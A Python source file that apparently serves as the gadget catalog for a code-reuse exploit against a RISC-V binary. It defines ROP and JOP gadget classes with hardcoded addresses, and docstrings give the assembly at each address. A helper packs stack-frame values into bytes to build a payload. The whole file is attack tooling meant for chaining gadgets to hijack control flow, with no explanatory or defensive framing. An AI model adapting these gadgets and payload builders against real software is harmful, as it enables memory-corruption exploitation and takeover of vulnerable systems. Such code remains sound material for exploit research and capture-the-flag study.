import struct

class JOP_Gadget():
    def __init__(self, vaddr):
        self.__vaddr = vaddr

    def get_vaddr(self):
        return self.__vaddr

class ROP_Gadget():
    def __init__(self, vaddr):
        self.__vaddr = vaddr
        self.__stack_frame = None

    def get_vaddr(self):
        return self.__vaddr

    def set_stack_frame(self, stack_frame):
        self.__stack_frame = stack_frame

    def print_gadget(self):
        ans = b""

        if self.__stack_frame is None:
            print("[Error] no stack frame given for charger")
        else:
            for value in self.__stack_frame:
                ans += struct.pack("q", value)

        return ans

class Charger(ROP_Gadget):
    '''
    ld ra, 0x68(sp)
    ld s0, 0x60(sp)
    ld s1, 0x58(sp)
    ld s2, 0x50(sp)
    ld s3, 0x48(sp)
    ld s4, 0x40(sp)
    ld s5, 0x38(sp)
    ld s6, 0x30(sp)
    ld s7, 0x28(sp)
    ld s8, 0x20(sp)
    ld s9, 0x18(sp)
    ld s10, 0x10(sp)
    ld s11, 0x8(sp)
    addi sp, sp, 0x70
    jr ra
    '''

    def __init__(self):
        super().__init__(0x4799e)

    def print_vaddr(self):
        return struct.pack("q", self.get_vaddr())

class CopyA3(ROP_Gadget):
    '''
    sw a3,0(s0)
    li a0, 0
    ld ra, 0x8(sp)
    ld s0, 0(sp)
    addi sp, sp, 0x10
    jr ra
    '''
    def __init__(self):
        super().__init__(0x381d2)

class RestoreA3(ROP_Gadget):
    '''
    lw a3, 0x40(s0)
    ld ra, 0x18(sp)
    ld s0, 0x10(sp)
    ld s1, 0x8(sp)
    ld s2, 0(sp)
    addi sp, sp, 0x20
    jr ra
    '''
    def __init__(self):
        super().__init__(0x48156)

class MovA0_S0(ROP_Gadget):
    '''
    ld ra, 0x38(sp)
    mv a0, s0
    ld s0, 0x30(sp)
    ld s1, 0x28(sp)
    ld s2, 0x20(sp)
    ld s3, 0x18(sp)
    ld s4, 0x10(sp)
    ld s5, 0x8(sp)
    ld s6, 0(sp)
    addi sp, sp, 0x40
    '''
    def __init__(self):
        super().__init__(0x1484c)

class AndA0_S0(ROP_Gadget):
    '''
    and	a3, a3, s0
    ld ra, 0x18(sp)
    ld s0, 0x10(sp)
    ld s1, 0x8(sp)
    addi sp, sp, 0x20
    jr ra
    '''
    def __init__(self):
        super().__init__(0x224f0)

class MovS0_A0(ROP_Gadget):
    '''
    mv s0, a0
    add	s10, s10, s4
    beqz s3, -0x38
    mv a2, s6
    mv a1, s1
    mv a0, s10
    beqz s2, -0xcc
    jalr s7
    '''
    def __init__(self):
        super().__init__(0x144ec)

class InitializeA3(JOP_Gadget):
    '''
    mv	a3, s7
    addi a2, sp, 0x40
    jalr s4
    '''
    def __init__(self):
        super().__init__(0x260f6)

class IncrementA3(JOP_Gadget):
    '''
    add	a3, a3, s1
    addi a2, sp, 0x48
    mv a0, s5
    jalr s4
    '''
    def __init__(self):
        super().__init__(0x2a1f4)

class LoadS0(JOP_Gadget):
    '''
    fld	fs0, 0x60(a3)
    addi a5, sp, 0x8
    li a4, 0
    li a7, 0
    li a6, 0
    mv a3, s3
    addi a2, sp, 0x10
    addi a1, s0, 0x50
    mv a0, s5
    jalr s4
    '''
    def __init__(self):
        super().__init__(0x16ede)

class StoreS0(JOP_Gadget):
    '''
    fsd	fs0, 0x28(a3)
    bnez a1, 0xae
    lw s9, 0x18(sp)
    jalr tp, 0x6d6(s8)
    '''
    def __init__(self):
        super().__init__(0x68da6)

class IncrementS0(JOP_Gadget):
    '''
    add	s0, s0, s11
    li a7, 1
    li a6, 0
    mv a5, s5
    li a4, 0
    mv a3, s0
    mv a2, s4
    mv a1, s3
    mv a0, s2
    jalr s1
    '''
    def __init__(self):
        super().__init__(0x209ea)

class InitializeA2(JOP_Gadget):
    '''
    mv a2, s6
    beqz s2, 0x1e
    jalr s7
    '''
    def __init__(self):
        super().__init__(0x1440e)

class InitializeA5_A7(JOP_Gadget):
    '''
    mv a5, s6
    mv a7, s5
    li a6, 0
    li a4, 0
    mv a3, s7
    addi a2, sp, 0x40
    jalr s4
    '''
    def __init__(self):
        super().__init__(0x2917c)